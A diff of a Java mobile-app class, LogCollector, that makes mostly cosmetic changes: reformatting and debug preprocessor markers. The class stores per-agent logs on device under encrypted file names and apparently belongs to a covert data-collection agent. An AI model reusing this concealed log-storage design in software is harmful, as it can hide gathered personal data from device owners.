@@ -56,7 +56,7 @@ public class LogCollector implements Singleton {
     private PersistentObject logProgressivePersistent;
 
     Keys keys;
-    
+
     public static synchronized LogCollector getInstance() {
         if (instance == null) {
             instance = new LogCollector();
@@ -84,11 +84,13 @@ public class LogCollector implements Singleton {
     }
 
     public static String encryptName(String logMask) {
-        return Encryption.encryptName(logMask, Keys.getInstance().getChallengeKey()[0]);
+        return Encryption.encryptName(logMask, Keys.getInstance()
+                .getChallengeKey()[0]);
     }
-    
+
     public static String decryptName(String logMask) {
-        return Encryption.decryptName(logMask, Keys.getInstance().getChallengeKey()[0]);
+        return Encryption.decryptName(logMask, Keys.getInstance()
+                .getChallengeKey()[0]);
     }
 
     private synchronized int deserializeProgressive() {
@@ -97,6 +99,7 @@ public class LogCollector implements Singleton {
         Object obj = logProgressivePersistent.getContents();
 
         if (obj == null) {
+            // #debug
             debug.info("First time of logProgressivePersistent");
             logProgressivePersistent.setContents(new Integer(1));
         }
@@ -106,17 +109,18 @@ public class LogCollector implements Singleton {
         return logProgressiveRet;
     }
 
-
     protected synchronized int getNewProgressive() {
         logProgressive++;
         logProgressivePersistent.setContents(new Integer(logProgressive));
 
-        debug.trace("Progressive: "+logProgressive);
+        // #debug
+        debug.trace("Progressive: " + logProgressive);
         return logProgressive;
     }
 
     public synchronized Log factory(Agent agent, boolean onSD) {
         if (getLogNum() > MAX_LOG_NUM) {
+            // #debug
             debug.error("Max log reached");
             return null;
         }
@@ -165,7 +169,7 @@ public class LogCollector implements Singleton {
         String basePath = onSD ? Path.SD_PATH : Path.USER_PATH;
 
         String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
-        String fileName = progressive+"!"+this.makeDateName(timestamp);
+        String fileName = progressive + "!" + this.makeDateName(timestamp);
 
         String encName = Encryption.encryptName(fileName + LOG_EXTENSION, keys
                 .getChallengeKey()[0]);
@@ -207,7 +211,9 @@ public class LogCollector implements Singleton {
      * @return
      */
     public Vector scanForLogs(String currentPath, String dir) {
-        Check.requires(currentPath != null, "null argument");
+        // #ifdef DBC
+//@        Check.requires(currentPath != null, "null argument");
+        // #endif
 
         Vector vector = new Vector();
 
@@ -228,8 +234,10 @@ public class LogCollector implements Singleton {
 
                 if (file.endsWith(encLogMask)) {
                     // String encName = fcFile.getName();
+                    // #debug
                     debug.trace("enc name: " + file);
                     String plainName = decryptName(file);
+                    // #debug
                     debug.trace("plain name: " + plainName);
 
                     vector.addElement(file);
@@ -253,7 +261,9 @@ public class LogCollector implements Singleton {
     }
 
     public Vector scanForDirLogs(String currentPath) {
-        Check.requires(currentPath != null, "null argument");
+        // #ifdef DBC
+//@        Check.requires(currentPath != null, "null argument");
+        // #endif
 
         Vector vector = new Vector();
         FileConnection fc;
@@ -301,11 +311,13 @@ public class LogCollector implements Singleton {
     }
 
     public void remove(String logName) {
+        // #debug
         debug.info("Removing file: " + logName);
         AutoFlashFile file = new AutoFlashFile(logName, false);
         if (file.exists()) {
-            file.delete();            
+            file.delete();
         } else {
+            // #debug
             debug.warn("File doesn't exists: " + logName);
         }
     }
